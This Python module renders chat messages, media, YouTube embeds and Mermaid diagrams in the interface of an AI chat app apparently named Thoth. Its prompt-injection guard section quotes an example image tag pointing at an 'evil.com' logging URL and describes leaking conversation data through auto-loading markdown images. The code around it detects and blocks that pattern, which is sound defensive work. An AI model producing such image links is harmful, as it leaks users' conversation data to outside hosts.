"""Thoth UI — message rendering helpers.

Pure UI builders — they create NiceGUI elements inside the current parent
context.  They receive ``state`` and ``p`` explicitly, never via closure.
"""

from __future__ import annotations

import html as _html
import logging
import re
from datetime import datetime

from nicegui import ui

logger = logging.getLogger(__name__)

from ui.state import AppState, P

def _img_data_uri(b64: str) -> str:
    """Return a data URI with the correct MIME type for a base64-encoded image."""
    if b64.startswith("iVBOR"):
        return f"data:image/png;base64,{b64}"
    if b64.startswith("UklGR"):
        return f"data:image/webp;base64,{b64}"
    if b64.startswith("R0lGO"):
        return f"data:image/gif;base64,{b64}"
    return f"data:image/jpeg;base64,{b64}"


def _img_ext(b64: str) -> str:
    """Return the file extension for a base64-encoded image."""
    if b64.startswith("iVBOR"):
        return "png"
    if b64.startswith("UklGR"):
        return "webp"
    if b64.startswith("R0lGO"):
        return "gif"
    return "jpg"


def render_image_with_save(b64_or_fname: str, extra_style: str = "", thread_id: str | None = None) -> None:
    """Render an image thumbnail with a small save-to-disk button.

    Accepts either a base64 string or a media filename (loaded from disk).
    The download always delivers the **original full-resolution** bytes.
    """
    import base64 as _b64_mod
    from ui.export import _save_export
    from datetime import datetime as _dt

    # Resolve filename → base64 if needed
    b64 = b64_or_fname
    from utils.media import is_image_filename
    if thread_id and is_image_filename(b64_or_fname):
        from threads import load_media_file
        raw = load_media_file(thread_id, b64_or_fname)
        if raw is None:
            ui.label("⚠ Image file not found").classes("text-xs text-grey-6")
            return
        b64 = _b64_mod.b64encode(raw).decode("ascii")

    data_uri = _img_data_uri(b64)
    ext = _img_ext(b64)
    style = "position: relative; display: inline-block;"
    if extra_style:
        style += f" {extra_style}"
    with ui.element("div").style(style):
        ui.image(data_uri).classes("w-80 rounded")
        # Capture b64 in closure for the click handler
        _b64_copy = b64

        def _save(b64_data=_b64_copy, extension=ext):
            ts = _dt.now().strftime("%Y%m%d_%H%M%S")
            raw = _b64_mod.b64decode(b64_data)
            _save_export(raw, f"thoth_image_{ts}.{extension}")

        ui.button(
            icon="download", on_click=_save,
        ).props("flat dense round size=xs").classes(
            "absolute bottom-1 right-1"
        ).style(
            "background: rgba(0,0,0,0.5); color: white; min-width: 28px; "
            "min-height: 28px; padding: 2px;"
        ).tooltip("Save image")


def render_video_with_save(path_or_fname: str, thread_id: str | None = None) -> None:
    """Render an HTML5 video player with a download button.

    *path_or_fname* is either an absolute file path or a media filename
    (resolved via thread media).  The video is served through the
    ``/_media`` static route so the browser can stream it natively.
    """
    from html import escape as _html_escape
    from pathlib import Path as _Path
    from ui.export import _save_export

    # Resolve to an absolute path
    abs_path: str | None = None
    if _Path(path_or_fname).is_absolute() and _Path(path_or_fname).exists():
        abs_path = path_or_fname
    elif thread_id:
        from threads import _MEDIA_DIR
        candidate = _MEDIA_DIR / thread_id / path_or_fname
        if candidate.exists():
            abs_path = str(candidate)

    if not abs_path:
        ui.label("⚠ Video file not found").classes("text-xs text-grey-6")
        return

    # Build a URL through the /_media static route
    # Path format: /_media/<thread_id>/<filename>
    p = _Path(abs_path)
    # Extract thread_id/filename from the path (…/media/<thread_id>/<filename>)
    try:
        parts = p.parts
        # Find 'media' folder in path parts
        for i, part in enumerate(parts):
            if part == "media" and i + 2 < len(parts):
                tid = parts[i + 1]
                fname = parts[i + 2]
                video_url = f"/_media/{tid}/{fname}"
                break
        else:
            # Fallback: serve as absolute file URI
            video_url = p.as_uri() if hasattr(p, "as_uri") else f"file:///{abs_path}"
    except Exception:
        video_url = f"file:///{abs_path}"

    safe_video_url = _html_escape(video_url, quote=True)

    style = "position: relative; display: inline-block;"
    with ui.element("div").style(style):
        ui.html(
            f'<video controls preload="metadata" style="max-width: 480px; border-radius: 8px;">'
            f'<source src="{safe_video_url}" type="video/mp4">'
            f"Your browser does not support video playback.</video>",
            sanitize=False,
        )
        _path_copy = abs_path

        def _save(video_path=_path_copy):
            try:
                raw = _Path(video_path).read_bytes()
                from datetime import datetime as _dt
                ts = _dt.now().strftime("%Y%m%d_%H%M%S")
                _save_export(raw, f"thoth_video_{ts}.mp4")
            except Exception:
                logger.warning("Failed to save video", exc_info=True)

        ui.button(
            icon="download", on_click=_save,
        ).props("flat dense round size=xs").classes(
            "absolute bottom-1 right-1"
        ).style(
            "background: rgba(0,0,0,0.5); color: white; min-width: 28px; "
            "min-height: 28px; padding: 2px;"
        ).tooltip("Save video")


# ── Bare-URL auto-linking ────────────────────────────────────────────
# Matches (in priority order) patterns we must *skip*, then bare URLs
# we want to convert.  Only capture-group 1 (bare URL) triggers a
# replacement; everything else is returned unchanged.
_AUTOLINK_RE = re.compile(
    r'```[\s\S]*?```'              # fenced code block  — skip
    r'|`[^`\n]+`'                  # inline code        — skip
    r'|\[[^\]]*\]\([^\)]+\)'       # markdown link      — skip
    r'|<https?://[^>]+>'           # angle-bracket link — skip
    r'|(https?://[^\s<>\)\]"\']+)',  # bare URL → group 1
)


def _autolink_replace(m: re.Match) -> str:
    url = m.group(1)
    if not url:
        return m.group(0)
    # Strip a single trailing punctuation that is almost certainly
    # sentence-ending rather than part of the URL.
    trail = ""
    if url[-1] in ".,;:!?":
        trail = url[-1]
        url = url[:-1]
    return f"[{url}]({url}){trail}"


def autolink_urls(text: str) -> str:
    """Wrap bare http(s) URLs in markdown link syntax.

    Preserves URLs already inside ``[text](url)``, ``<url>``, inline
    code, or fenced code blocks.
    """
    if "http" not in text:
        return text
    return _AUTOLINK_RE.sub(_autolink_replace, text)


# Matches a YouTube URL with optional surrounding markdown link + bold:
#   **[link text](https://youtube.com/watch?v=XXXXXXXXXXX)**
#   [label](https://youtu.be/XXXXXXXXXXX)
#   https://youtube.com/watch?v=XXXXXXXXXXX          (bare)
_YT_EMBED_RE = re.compile(
    r'\*{0,2}'                                        # optional leading **
    r'(?:\[([^\]]*)\]\()?'                            # optional [link text](
    r'https?://(?:www\.)?'
    r'(?:youtube\.com/(?:watch\?v=|shorts/)|youtu\.be/)'
    r'([a-zA-Z0-9_-]{11})'                           # video id
    r'[^\s)\]]*'                                      # trailing query params
    r'(?:\))?'                                        # optional closing )
    r'\*{0,2}',                                       # optional trailing **
)

_MERMAID_START_RE = re.compile(
    r"^(graph|flowchart|sequenceDiagram|classDiagram|erDiagram|journey|gantt|"
    r"stateDiagram(?:-v2)?|mindmap|timeline|pie)\b",
    re.IGNORECASE,
)

# Matches a fenced ```mermaid ... ``` block (after _auto_fence_mermaid has run)
_MERMAID_FENCE_RE = re.compile(
    r"^```mermaid\s*\n(.*?)\n```",
    re.MULTILINE | re.DOTALL,
)


def _is_mermaid_continuation_line(line: str) -> bool:
    """Return True if a line likely belongs to a Mermaid diagram body."""
    s = line.strip()
    if not s:
        return True
    lower = s.lower()
    if lower.startswith(
        (
            "graph ",
            "flowchart ",
            "sequencediagram",
            "classdiagram",
            "erdiagram",
            "journey",
            "gantt",
            "statediagram",
            "mindmap",
            "timeline",
            "pie",
            "subgraph",
            "end",
            "classdef ",
            "class ",
            "style ",
            "linkstyle ",
            "click ",
            "direction ",
            "%%",
        )
    ):
        return True
    if any(tok in s for tok in ("-->", "---", "-.->", "==>", "<--", "<->", ":::", "|", "[", "]", "(", ")", "{", "}")):
        return True
    return False


def _auto_fence_mermaid(text: str) -> str:
    """Wrap Mermaid plaintext in a fenced block when missing fences.

    Models sometimes output Mermaid syntax without ```mermaid fences,
    which prevents the UI mermaid renderer from detecting it.
    """
    if not text or "```mermaid" in text:
        return text

    lines = text.splitlines()
    start_idx = None
    for i, line in enumerate(lines):
        if _MERMAID_START_RE.match(line.strip()):
            start_idx = i
            break

    if start_idx is None:
        return text

    end_idx = len(lines)
    body_lines: list[str] = []
    for i in range(start_idx, len(lines)):
        line = lines[i]
        if _is_mermaid_continuation_line(line):
            body_lines.append(line)
        else:
            end_idx = i
            break

    mermaid_body = "\n".join(body_lines).strip()
    # Avoid false positives: Mermaid blocks generally include edges/subgraphs.
    if "-->" not in mermaid_body and "subgraph" not in mermaid_body.lower():
        return text

    prefix = "\n".join(lines[:start_idx]).rstrip()
    suffix = "\n".join(lines[end_idx:]).strip()
    fenced = f"```mermaid\n{mermaid_body}\n```"
    out_parts = []
    if prefix:
        out_parts.append(prefix)
    out_parts.append(fenced)
    if suffix:
        out_parts.append(suffix)
    return "\n\n".join(out_parts)


def _split_mermaid(parts: list[tuple[str, str | None]]) -> list[tuple[str, str | None]]:
    """Second pass: split any 'text' parts that contain fenced mermaid blocks."""
    out: list[tuple[str, str | None]] = []
    for kind, value in parts:
        if kind != "text" or not value or "```mermaid" not in value:
            out.append((kind, value))
            continue
        last = 0
        for m in _MERMAID_FENCE_RE.finditer(value):
            before = value[last:m.start()]
            if before.strip():
                out.append(("text", before))
            out.append(("mermaid", m.group(1)))
            last = m.end()
        tail = value[last:]
        if tail.strip():
            out.append(("text", tail))
    return out


# ── Prompt‑injection defence: markdown image exfiltration guard ──────────
# Matches ![alt](url) where the URL query/fragment is suspiciously long,
# which could be an attempt to exfiltrate conversation data via an
# auto-loading <img src="https://evil.com/log?data=..."> tag.
_EXFIL_IMG_RE = re.compile(
    r"!\[([^\]]*)\]"                     # ![alt text]
    r"\("                                # (
    r"(https?://[^)\s]+)"               # URL
    r"\)",                               # )
)
_B64_SEGMENT_RE_UI = re.compile(r"[A-Za-z0-9+/=]{100,}")


def _sanitize_exfil_images(text: str) -> str:
    """Replace markdown images whose URLs look like data‑exfiltration attempts.

    Suspicious images are converted to plain-text links so the content is
    still accessible but the browser won't auto-fire a request with
    embedded data in the query string.
    """
    def _check(m: re.Match) -> str:
        url = m.group(2)
        qmark = url.find("?")
        # Check query string length
        if qmark != -1 and len(url) - qmark > 200:
            alt = m.group(1) or "image"
            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
        # Check for base64 segments in URL
        if _B64_SEGMENT_RE_UI.search(url):
            alt = m.group(1) or "image"
            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
        return m.group(0)  # pass through unchanged
    return _EXFIL_IMG_RE.sub(_check, text)


def render_text_with_embeds(text: str) -> None:
    """Render markdown text with inline YouTube video embeds and mermaid diagrams."""
    if not text:
        return
    text = _sanitize_exfil_images(text)
    text = _auto_fence_mermaid(text)
    seen_yt: set[str] = set()
    last_end = 0
    parts: list[tuple[str, str | None]] = []
    for match in _YT_EMBED_RE.finditer(text):
        label = match.group(1)   # link text, or None if bare URL
        vid_id = match.group(2)
        # Text segment before this embed
        before = text[last_end:match.start()]
        if before.strip():
            parts.append(("text", before))
        # Optional link-text label above the embed
        if label:
            parts.append(("text", label))
        if vid_id not in seen_yt:
            seen_yt.add(vid_id)
            parts.append(("video", vid_id))
        last_end = match.end()
    # Remaining text after the last embed
    if last_end < len(text):
        tail = text[last_end:]
        if tail.strip():
            parts.append(("text", tail))
    # If no YouTube embeds were found, start with the full text as one part
    if not parts:
        parts = [("text", text)]
    # Second pass: extract fenced mermaid blocks from text parts
    parts = _split_mermaid(parts)
    # Render all parts
    for kind, value in parts:
        if kind == "text" and value and value.strip():
            ui.markdown(autolink_urls(value), extras=['code-friendly', 'fenced-code-blocks', 'tables']).classes("thoth-msg w-full")
        elif kind == "video":
            ui.html(
                f'<iframe width="280" height="158" '
                f'src="https://www.youtube.com/embed/{value}" '
                f'frameborder="0" allowfullscreen '
                f'style="border-radius:8px;"></iframe>',
                sanitize=False,
            )
        elif kind == "mermaid" and value:
            ui.html(
                f'<div class="mermaid-rendered"><pre class="mermaid">{_html.escape(value)}</pre></div>',
                sanitize=False,
            )


def render_message_content(msg: dict, thread_id: str | None = None) -> None:
    """Render a single message's content inside the current parent element."""
    from ui.tool_trace import display_tool_content, group_tool_results

    role = msg.get("role", "assistant")

    # Thinking / reasoning (collapsed by default)
    thinking = msg.get("thinking")
    if thinking and role == "assistant":
        with ui.expansion(
            "\U0001f4ad Thinking", icon="psychology"
        ).classes("w-full"):
            ui.code(thinking.strip()[:8_000]).classes("w-full text-xs")

    # Tool results
    tool_results = msg.get("tool_results")
    tool_results_for_media = tool_results
    if tool_results:
        for group in group_tool_results(tool_results):
            with ui.expansion(f"✅ {group.label}", icon="check_circle").classes("w-full"):
                for idx, tr in enumerate(group.results, start=1):
                    title = f"#{idx}" if group.count > 1 else group.name
                    with ui.expansion(title, icon="subdirectory_arrow_right").classes("w-full"):
                        content = tr.get("content", "")
                        if isinstance(content, str) and content.startswith("__CHART__:"):
                            _me = content.find("\n\n", 10)
                            _fj = content[10:] if _me == -1 else content[10:_me]
                            _dt = "Chart created" if _me == -1 else content[_me + 2:]
                            try:
                                import plotly.io as _pio
                                fig = _pio.from_json(_fj)
                                ui.plotly(fig).classes("w-full")
                            except Exception:
                                logger.debug("Chart rendering failed in tool result", exc_info=True)
                            content = _dt
                        if isinstance(content, str) and content.startswith("__IMAGE__:"):
                            _me = content.find("\n\n", 10)
                            _ib = content[10:] if _me == -1 else content[10:_me]
                            _dt = "Image generated" if _me == -1 else content[_me + 2:]
                            try:
                                render_image_with_save(_ib)
                            except Exception:
                                logger.debug("Image rendering failed in tool result", exc_info=True)
                            content = _dt
                        if isinstance(content, str) and content.startswith("__HTML__:"):
                            _me = content.find("\n\n", 9)
                            _hc = content[9:] if _me == -1 else content[9:_me]
                            _dt = "" if _me == -1 else content[_me + 2:]
                            try:
                                ui.html(_hc).classes("w-full")
                            except Exception:
                                logger.debug("HTML widget rendering failed in tool result", exc_info=True)
                            content = _dt
                        display = display_tool_content(content)
                        if display:
                            ui.code(display).classes("w-full text-xs")
    tool_results = tool_results_for_media

    # Images (live) or placeholder (reloaded thread)
    images = msg.get("images")
    if images:
        caption = "📎 Attached" if role == "user" else "📷 Captured"
        for img_entry in images:
            render_image_with_save(img_entry, thread_id=thread_id)
            ui.label(caption).classes("text-xs text-grey-6")

    # Videos (generated clips)
    videos = msg.get("videos")
    if videos:
        for vid_entry in videos:
            if isinstance(vid_entry, dict):
                fname = vid_entry.get("filename") or vid_entry.get("path", "")
            else:
                fname = str(vid_entry)
            render_video_with_save(fname, thread_id=thread_id)
            ui.label("🎬 Generated video").classes("text-xs text-grey-6")

    if not images and tool_results and any(
        tr.get("name") in ("analyze_image", "👁️ Vision") for tr in tool_results
    ):
        with ui.row().classes("items-center gap-2").style(
            "padding: 0.5rem 0.75rem; border-radius: 8px; "
            "background: rgba(255,255,255,0.04);"
        ):
            ui.icon("image", size="sm").style("color: #888;")
            ui.label("Image not available — captures are transient to save space").style(
                "font-size: 0.8rem; color: #888; font-style: italic;"
            )

    # Charts (Plotly)
    charts = msg.get("charts")
    if charts:
        try:
            import plotly.io as _pio
            for fig_json in charts:
                fig = _pio.from_json(fig_json)
                ui.plotly(fig).classes("w-full")
        except Exception:
            logger.debug("Chart rendering failed", exc_info=True)

    # Main text with inline YouTube embeds
    text = msg.get("content", "")
    if isinstance(text, list):
        text = " ".join(str(t) for t in text)
    if not isinstance(text, str):
        text = str(text) if text else ""
    if text:
        render_text_with_embeds(text)

    # Trigger highlight.js on new code blocks + render mermaid diagrams
    try:
        ui.run_javascript("document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));")
        ui.run_javascript(
            "document.querySelectorAll('pre code.language-mermaid').forEach(function(el) {"
            "  var pre = el.parentElement;"
            "  var div = document.createElement('div');"
            "  div.className = 'mermaid-rendered';"
            "  div.textContent = el.textContent;"
            "  pre.replaceWith(div);"
            "});"
            "mermaid.run({nodes: document.querySelectorAll('pre.mermaid'), suppressErrors: true});"
        )
    except RuntimeError:
        logger.debug("JS runtime unavailable for hljs/mermaid", exc_info=True)


def add_chat_message(msg: dict, p: P, thread_id: str | None = None) -> None:
    """Append a rendered chat message to the chat container."""
    if p.chat_container is None:
        return
    is_user = msg["role"] == "user"
    avatar_cls = "thoth-avatar thoth-avatar-user" if is_user else "thoth-avatar thoth-avatar-bot"
    if is_user:
        avatar_content = "👤"
        name = "You"
    else:
        from identity import get_assistant_name
        from ui.status_bar import get_bot_avatar_html
        avatar_content = get_bot_avatar_html()
        name = get_assistant_name()
    stamp = msg.get("timestamp", datetime.now().strftime("%H:%M"))
    with p.chat_container:
        row_cls = "thoth-msg-row thoth-msg-row-user" if is_user else "thoth-msg-row"
        with ui.element("div").classes(row_cls):
            ui.html(f'<div class="{avatar_cls}">{avatar_content}</div>', sanitize=False)
            with ui.column().classes("thoth-msg-body gap-1"):
                ui.html(
                    f'<div class="thoth-msg-header">'
                    f'<span class="thoth-msg-name">{name}</span>'
                    f'<span class="thoth-msg-stamp">{stamp}</span>'
                    f'</div>',
                    sanitize=False,
                )
                render_message_content(msg, thread_id=thread_id)
